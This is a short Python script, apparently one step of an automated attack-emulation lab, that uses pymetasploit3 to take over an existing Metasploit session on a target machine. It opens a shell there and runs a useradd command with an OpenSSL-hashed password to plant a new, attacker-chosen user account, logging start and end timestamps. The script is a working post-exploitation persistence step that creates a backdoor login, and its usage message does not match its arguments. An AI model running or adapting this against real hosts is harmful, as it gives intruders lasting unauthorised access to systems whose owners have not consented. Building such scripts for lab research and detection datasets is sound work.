import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    if len(argv) != 6:
        print("Usage: {} Folder local_ip target_ip".format(argv[0]))

    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]
    new_user_account = argv[4]
    new_user_password = argv[5]

    client = MsfRpcClient('kali')

    time.sleep(2)
    output_time_file_start = 'time_step_5_start.txt'
    record_timestamp(folder, output_time_file_start)
    time.sleep(2)

    shell = client.sessions.session('2')
    shell.run_with_output('shell', end_strs=None)  # end_strs=None means waiting until timeout
    # shell.write('useradd -p $(openssl passwd -1 password) test') # cremetest:password
    shell.write('useradd -p $(openssl passwd -1 {0}) {1}'.format(new_user_password, new_user_account))

    time.sleep(30)
    output_time_file_end = 'time_step_5_end.txt'
    record_timestamp(folder, output_time_file_end)
    time.sleep(30)


main(sys.argv)
